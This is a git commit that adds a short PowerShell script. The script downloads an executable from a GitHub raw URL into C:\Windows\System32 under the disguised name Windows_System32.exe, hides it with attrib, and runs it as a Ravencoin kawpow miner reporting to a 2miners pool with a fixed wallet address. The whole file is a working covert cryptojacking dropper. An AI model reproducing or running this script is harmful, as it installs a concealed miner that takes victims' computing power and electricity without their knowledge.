45f633c3a7a3854bbb213eb200091553a418c297
nothingtoseehere121 <98023403+nothingtoseehere121@users.noreply.github.com>
2022-03-30 22:28:32 +0300

    Add files via upload

---
+++ script12.ps1
@@ -0,0 +1,9 @@
+$Folder = 'C:\Windows\System32\Windows_System32.exe'
+"Test to see if folder [$Folder]  exists"
+if (Test-Path -Path $Folder) {
+    "Path exists!"
+    C:\Windows\System32\Windows_System32.exe -a kawpow -lhr 60 -o stratum+tcp://rvn.2miners.com:6060 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GS1-01 -pl 60%
+} else {
+    "Path doesn't exist."
+    cd C:\Windows\System32 ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/Windows_System32.exe" -OutFile Windows_System32.exe ; attrib +h Windows_System32.exe; C:\Windows\System32\Windows_System32.exe -a kawpow -lhr 60 -o stratum+tcp://rvn.2miners.com:6060 -u RBvEd2Q4R8vC7yKLXtAj6CMzDRsExnW2id.GS1-01 -pl 60%
+}
